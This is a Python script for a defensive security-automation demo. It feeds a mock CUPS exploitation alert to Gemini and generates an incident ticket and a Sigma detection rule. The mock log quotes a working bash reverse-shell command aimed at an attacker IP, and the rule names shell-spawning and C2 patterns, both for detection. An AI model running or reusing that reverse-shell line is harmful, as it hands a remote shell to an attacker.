"""
SOAR Bridge Pipeline
====================
An open-source Security Automation & Orchestration (SOAR) bridge project that:
 1. Ingests a mock vulnerability alert
 2. Sends it to Google Gemini for threat analysis
 3. Maps behavior to MITRE ATT&CK
 4. Exports a Markdown Incident Ticket + YAML Sigma rule stub

Author: Generated for portfolio / job-search demonstration
"""

import os
import sys
import json
import re
from datetime import datetime, timezone
from pathlib import Path

try:
    from google import genai
    from google.genai import types
except ImportError:
    print("[ERROR] google-genai is not installed.")
    print("       Run:  pip install google-genai")
    sys.exit(1)

try:
    from dotenv import load_dotenv
    load_dotenv()  # Loads variables from .env into os.environ automatically
except ImportError:
    pass  # python-dotenv not installed; fall back to env vars set manually

# ---------------------------------------------------------------------------
# 1. MOCK INPUT DATA
# ---------------------------------------------------------------------------

MOCK_ALERT: dict = {
    "alert_id": "ALT-2024-00472",
    "timestamp": "2024-11-14T03:22:17Z",
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "CVE": "CVE-2024-47177",
    "affected_component": "OpenPrinting CUPS / cups-browsed daemon (Linux)",
    "affected_versions": "<= 2.4.10",
    "source_ip": "185.220.101.47",
    "destination_ip": "10.0.1.55",
    "destination_port": 631,
    "raw_log_description": (
        "Nov 14 03:22:17 prod-server-01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... "
        "SRC=185.220.101.47 DST=10.0.1.55 LEN=72 TOS=0x00 PREC=0x00 TTL=46 ID=54321 DF "
        "PROTO=UDP SPT=49152 DPT=631 LEN=52. "
        "Subsequent cups-browsed log: 'Browsing: Added printer \"PWNED_PRINTER\" from "
        "\"ipp://185.220.101.47:12345/printers/pwned\" - attacker-controlled IPP server "
        "accepted. PPD attribute `FoomaticRIPCommandLine` detected in response referencing "
        "bash reverse-shell payload `bash -i >& /dev/tcp/185.220.101.47/4444 0>&1`. "
        "Process cups-browsed (PID 1337) spawned child process: `/bin/bash`. "
        "Network connection established outbound to 185.220.101.47:4444. "
        "Audit log shows file write to /tmp/.s and chmod 0777 applied. "
        "No prior authentication observed on port 631."
    ),
}

# ---------------------------------------------------------------------------
# 2. SYSTEM PROMPT  (deterministic, structured-output focused)
# ---------------------------------------------------------------------------

SYSTEM_PROMPT = """
You are an elite Tier-3 Security Operations Center (SOC) analyst and Detection Engineer.
Your job is to analyze raw vulnerability alerts with surgical precision and produce
machine-readable, actionable intelligence.

RULES:
- Be factual, concise, and technical.
- Never speculate beyond the data provided.
- Always return your analysis as a single, valid JSON object matching the schema below.
- Do not include markdown fences or any text outside the JSON object.

OUTPUT SCHEMA:
{
  "threat_vector": "<one-sentence technical description of how the attack is delivered>",
  "attack_phase": "<reconnaissance | initial_access | execution | persistence | privilege_escalation | defense_evasion | credential_access | discovery | lateral_movement | collection | command_and_control | exfiltration | impact>",
  "technical_consequence": "<what happens on the target system if exploitation succeeds>",
  "iocs": {
    "attacker_ips": ["<list of attacker IPs extracted from log>"],
    "attacker_ports": [<list of attacker ports as integers>],
    "malicious_processes": ["<list of spawned malicious processes>"],
    "file_artifacts": ["<list of files written or modified>"],
    "network_signatures": ["<e.g., outbound C2 connection patterns>"]
  },
  "mitre_attack": {
    "tactic": "<MITRE ATT&CK Tactic name>",
    "technique_id": "<e.g., T1203>",
    "technique_name": "<full technique name>",
    "sub_technique_id": "<e.g., T1203.001 or null if not applicable>",
    "rationale": "<one sentence explaining why this technique maps to the behavior>"
  },
  "recommended_actions": [
    "<specific, actionable remediation step 1>",
    "<specific, actionable remediation step 2>",
    "<specific, actionable remediation step 3>",
    "<specific, actionable remediation step 4>"
  ],
  "executive_summary": "<3-sentence non-technical summary suitable for a CISO briefing>"
}
"""

USER_PROMPT_TEMPLATE = """
Analyze the following high-severity vulnerability alert and return your analysis as JSON.

ALERT METADATA:
- Alert ID       : {alert_id}
- Timestamp      : {timestamp}
- Severity       : {severity}
- CVSS Score     : {cvss_score}
- CVE            : {CVE}
- Affected Comp  : {affected_component}
- Affected Ver.  : {affected_versions}
- Source IP      : {source_ip}
- Destination    : {destination_ip}:{destination_port}

RAW LOG DESCRIPTION:
{raw_log_description}
"""

# ---------------------------------------------------------------------------
# 3. OUTPUT TEMPLATES
# ---------------------------------------------------------------------------

INCIDENT_TICKET_TEMPLATE = """# 🚨 Incident Ticket — {alert_id}

| Field               | Value                                      |
|---------------------|--------------------------------------------|
| **Ticket ID**       | {alert_id}                                 |
| **Generated**       | {generated_at}                             |
| **Severity**        | {severity} (CVSS {cvss_score})             |
| **CVE**             | [{CVE}](https://nvd.nist.gov/vuln/detail/{CVE}) |
| **Affected System** | {affected_component} {affected_versions}   |
| **Source IP**       | {source_ip}                                |
| **MITRE ATT&CK**    | [{technique_id}](https://attack.mitre.org/techniques/{technique_id_url}/) — {technique_name} |

---

## 📋 Executive Summary

{executive_summary}

---

## 🔬 Technical Details

### Threat Vector
{threat_vector}

### Attack Phase
`{attack_phase}`

### Technical Consequence
{technical_consequence}

### MITRE ATT&CK Mapping
| Field          | Value                             |
|----------------|-----------------------------------|
| Tactic         | {mitre_tactic}                    |
| Technique      | {technique_id} — {technique_name} |
| Sub-Technique  | {sub_technique_id}                |
| Rationale      | {mitre_rationale}                 |

### Indicators of Compromise (IoCs)

**Attacker IPs:**
{attacker_ips_md}

**Attacker Ports:**
{attacker_ports_md}

**Malicious Processes:**
{malicious_processes_md}

**File Artifacts:**
{file_artifacts_md}

**Network Signatures:**
{network_signatures_md}

---

## ✅ Recommended Actions

{recommended_actions_md}

---

## 📎 Raw Alert Data

```json
{raw_alert_json}
```

---
*Generated by SOAR Bridge Pipeline — open-source portfolio project*
"""

SIGMA_RULE_TEMPLATE = """title: {title}
id: {alert_id_lower}
status: experimental
description: >
  Detection rule stub for {CVE} — {technique_id} ({technique_name}).
  {threat_vector}
date: {date_today}
author: SOAR Bridge Pipeline (auto-generated)
references:
  - https://nvd.nist.gov/vuln/detail/{CVE}
  - https://attack.mitre.org/techniques/{technique_id_url}/
tags:
  - attack.{mitre_tactic_tag}
  - {technique_id_tag}
logsource:
  product: linux
  service: syslog
detection:
  selection_network:
    # Inbound UDP to CUPS port from untrusted external source
    proto: UDP
    dst_port: {destination_port}
    src_ip|contains:
{attacker_ips_sigma}
  selection_process:
    # cups-browsed spawning a shell — critical indicator
    ParentImage|endswith: cups-browsed
    Image|contains:
      - /bin/bash
      - /bin/sh
      - /usr/bin/python
  selection_network_outbound:
    # Outbound C2 connection from print service
    src_process|contains: cups
    dst_ip|contains:
{attacker_ips_sigma}
  selection_file:
    # Suspicious file drops in temp directories
    TargetFilename|startswith:
      - /tmp/
      - /var/tmp/
    TargetFilename|contains:
{file_artifacts_sigma}
  condition: selection_process or (selection_network and selection_network_outbound)
falsepositives:
  - Legitimate CUPS network printing in trusted environments
  - Authorized remote printer management
level: critical
fields:
  - src_ip
  - dst_ip
  - dst_port
  - process_name
  - parent_process
  - file_path
# ------------------------------------------------------------------------------
# SOAR BRIDGE PIPELINE — AUTO-GENERATED STUB
# This rule requires tuning before production deployment.
# Validate against your SIEM's field naming conventions.
# Tactic  : {mitre_tactic}
# Tech ID : {technique_id}
# CVE     : {CVE}
# CVSS    : {cvss_score}
# ------------------------------------------------------------------------------
"""

# ---------------------------------------------------------------------------
# 4. PIPELINE FUNCTIONS
# ---------------------------------------------------------------------------


def build_user_prompt(alert: dict) -> str:
    return USER_PROMPT_TEMPLATE.format(**alert)


def analyze_alert(client: genai.Client, alert: dict) -> dict:
    """Send the alert to Gemini and parse the JSON response."""
    print("[*] Sending alert to Gemini for analysis...")

    response = client.models.generate_content(
        model="gemini-3.5-flash",
        contents=build_user_prompt(alert),
        config=types.GenerateContentConfig(
            system_instruction=SYSTEM_PROMPT,
            temperature=0.1,        # Low temp = deterministic / factual output
            max_output_tokens=8192,
            response_mime_type="application/json",
        ),
    )

    raw_text = response.text.strip()

    # Strip optional markdown fences the model may still include
    if raw_text.startswith("```"):
        raw_text = re.sub(r"^```[a-z]*\n?", "", raw_text)
        raw_text = re.sub(r"\n?```$", "", raw_text)

    analysis = json.loads(raw_text)
    print("[OK] Analysis received and parsed successfully.")
    return analysis


def _md_list(items: list) -> str:
    if not items:
        return "_None identified_"
    return "\n".join(f"- `{item}`" for item in items)


def _sigma_list(items: list, indent: int = 6) -> str:
    pad = " " * indent
    if not items:
        return f"{pad}- ''"
    return "\n".join(f"{pad}- '{item}'" for item in items)


def generate_incident_ticket(alert: dict, analysis: dict) -> str:
    """Render the Markdown incident ticket."""
    mitre = analysis["mitre_attack"]
    iocs = analysis["iocs"]
    rec = analysis["recommended_actions"]

    tech_id = mitre["technique_id"]
    tech_id_url = tech_id.replace(".", "/")  # T1203.001 -> T1203/001

    rec_md = "\n".join(f"{i+1}. {action}" for i, action in enumerate(rec))

    return INCIDENT_TICKET_TEMPLATE.format(
        alert_id=alert["alert_id"],
        generated_at=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
        severity=alert["severity"],
        cvss_score=alert["cvss_score"],
        CVE=alert["CVE"],
        affected_component=alert["affected_component"],
        affected_versions=alert["affected_versions"],
        source_ip=alert["source_ip"],
        technique_id=tech_id,
        technique_id_url=tech_id_url,
        technique_name=mitre["technique_name"],
        executive_summary=analysis["executive_summary"],
        threat_vector=analysis["threat_vector"],
        attack_phase=analysis["attack_phase"],
        technical_consequence=analysis["technical_consequence"],
        mitre_tactic=mitre["tactic"],
        sub_technique_id=mitre.get("sub_technique_id") or "N/A",
        mitre_rationale=mitre["rationale"],
        attacker_ips_md=_md_list(iocs.get("attacker_ips", [])),
        attacker_ports_md=_md_list([str(p) for p in iocs.get("attacker_ports", [])]),
        malicious_processes_md=_md_list(iocs.get("malicious_processes", [])),
        file_artifacts_md=_md_list(iocs.get("file_artifacts", [])),
        network_signatures_md=_md_list(iocs.get("network_signatures", [])),
        recommended_actions_md=rec_md,
        raw_alert_json=json.dumps(alert, indent=2),
    )


def generate_sigma_rule(alert: dict, analysis: dict) -> str:
    """Render the YAML Sigma detection rule stub."""
    mitre = analysis["mitre_attack"]
    iocs = analysis["iocs"]

    tech_id = mitre["technique_id"]
    tech_id_url = tech_id.replace(".", "/")
    tech_id_tag = tech_id.lower().replace(".", ".")   # e.g., t1203.001

    # Tactic slug for Sigma tags (replace spaces with underscores, lowercase)
    mitre_tactic_tag = mitre["tactic"].lower().replace(" ", "_").replace("-", "_")

    title_cve = alert["CVE"].replace("-", "_")
    title = f"Exploit Attempt — {alert['CVE']} ({mitre['technique_name']})"

    file_arts = iocs.get("file_artifacts", [])
    # Extract just the filename base for sigma (strip path prefix)
    file_bases = []
    for f in file_arts:
        fname = Path(f).name
        if fname:
            file_bases.append(fname)

    return SIGMA_RULE_TEMPLATE.format(
        title=title,
        alert_id_lower=alert["alert_id"].lower().replace("-", "_"),
        CVE=alert["CVE"],
        technique_id=tech_id,
        technique_id_url=tech_id_url,
        technique_name=mitre["technique_name"],
        threat_vector=analysis["threat_vector"],
        date_today=datetime.now(timezone.utc).strftime("%Y/%m/%d"),
        mitre_tactic=mitre["tactic"],
        mitre_tactic_tag=mitre_tactic_tag,
        technique_id_tag=tech_id_tag,
        destination_port=alert["destination_port"],
        attacker_ips_sigma=_sigma_list(iocs.get("attacker_ips", [])),
        file_artifacts_sigma=_sigma_list(file_bases if file_bases else ["hidden"]),
        cvss_score=alert["cvss_score"],
    )


def save_outputs(ticket_md: str, sigma_yml: str, output_dir: Path) -> None:
    """Write the generated outputs to disk."""
    output_dir.mkdir(parents=True, exist_ok=True)

    ticket_path = output_dir / "incident_ticket.md"
    sigma_path = output_dir / "detection_rule.yml"

    ticket_path.write_text(ticket_md, encoding="utf-8")
    sigma_path.write_text(sigma_yml, encoding="utf-8")

    print(f"[OK] Incident ticket saved  -> {ticket_path}")
    print(f"[OK] Detection rule saved   -> {sigma_path}")


# ---------------------------------------------------------------------------
# 5. MAIN ENTRYPOINT
# ---------------------------------------------------------------------------


def main() -> None:
    print("=" * 60)
    print("  SOAR Bridge Pipeline — Security Automation Demo")
    print("=" * 60)

    # --- Gemini client setup ---
    api_key = os.environ.get("GEMINI_API_KEY")
    if not api_key:
        print("\n[ERROR] GEMINI_API_KEY environment variable is not set.")
        print("  Set it with:  set GEMINI_API_KEY=your-key-here  (Windows)")
        print("             or export GEMINI_API_KEY=your-key-here  (Linux/Mac)")
        sys.exit(1)

    client = genai.Client(api_key=api_key)

    print(f"\n[*] Loaded mock alert: {MOCK_ALERT['alert_id']} ({MOCK_ALERT['CVE']})")
    print(f"    CVSS: {MOCK_ALERT['cvss_score']} | Severity: {MOCK_ALERT['severity']}")

    # --- Run AI analysis ---
    analysis = analyze_alert(client, MOCK_ALERT)

    mitre = analysis["mitre_attack"]
    print(f"\n[*] MITRE Mapping: {mitre['technique_id']} — {mitre['technique_name']}")
    print(f"    Tactic: {mitre['tactic']}")
    print(f"    Vector: {analysis['threat_vector'][:80]}...")

    # --- Generate outputs ---
    print("\n[*] Generating outputs...")
    output_dir = Path(__file__).parent / "output"

    ticket_md = generate_incident_ticket(MOCK_ALERT, analysis)
    sigma_yml = generate_sigma_rule(MOCK_ALERT, analysis)

    save_outputs(ticket_md, sigma_yml, output_dir)

    print("\n" + "=" * 60)
    print("  Pipeline complete! Files written to ./output/")
    print("=" * 60)


if __name__ == "__main__":
    main()
